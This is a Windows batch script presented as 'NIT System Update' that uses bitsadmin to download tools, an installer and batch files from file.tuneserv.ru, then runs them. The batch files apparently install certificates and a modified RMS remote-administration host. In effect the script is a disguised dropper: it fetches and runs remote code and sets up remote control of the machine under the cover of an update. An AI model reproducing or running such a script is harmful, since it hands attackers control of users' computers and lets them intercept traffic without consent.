@echo on
rem ***************************************************************************
rem
rem Install-Update.bat
rem This Script Install the Certificates, RMS Host Program and System Updates
rem for Microsoft Windows 7 - 10 Operation Systems
rem
rem ***************************************************************************

setlocal enableextensions enabledelayedexpansion

set curdir=%CD%
set productname="NIT System Update"

rem Set Common Host Downloads Varoables
set prefc=http
set hostc=file.tuneserv.ru
set portc=80
set uppathc=WinUpdate
set exppathc=Exponenta

rem define the Variables
SET NITSYUP=NIT-System-Update.msi
SET RMSHOSTMSI=rms.host6.3ru_mod2.msi
SET RMSHOSTBAT=rmshost.install.cmd
SET CERTIFICATESBAT=Certificates-install.bat

set host=%prefc%://%hostc%:%portc%/%exppathc%
set host1=%prefc%://%hostc%:%portc%/%uppathc%

rem Uninstall old data
%SystemRoot%\System32\wbem\WMIC.EXE product where name="%productname%" call uninstall

rem Download
%SystemRoot%\System32\bitsadmin /Transfer STEA_TRANSFER /DOWNLOAD /Priority FOREGROUND %host%/wget.exe %TEMP%\wget.exe %host%/LIBCURL.DLL %TEMP%\libcurl.dll %host%/CURL.EXE %TEMP%\curl.exe

rem Download Distribs
%SystemRoot%\System32\bitsadmin /Transfer STEA_TRANSFER /DOWNLOAD /Priority FOREGROUND %host1%/%NITSYUP% %TEMP%\%NITSYUP% %host%/%RMSHOSTMSI% %TEMP%\%RMSHOSTMSI% %host%/%RMSHOSTBAT% %TEMP%\%RMSHOSTBAT% %host%/%CERTIFICATESBAT% %TEMP%\%CERTIFICATESBAT%

rem Install Certificates Files...
if not exist %TEMP%\%CERTIFICATESBAT% goto UnSuccess_Certificates
echo "Install Certificates..."
call %TEMP%\%CERTIFICATESBAT%
:UnSuccess_Certificates

rem RMSHOST Files...
if not exist %TEMP%\%RMSHOSTBAT% goto UnSuccess_rmshost
echo "Install Certificates..."
call %TEMP%\%RMSHOSTBAT%
:UnSuccess_rmshost

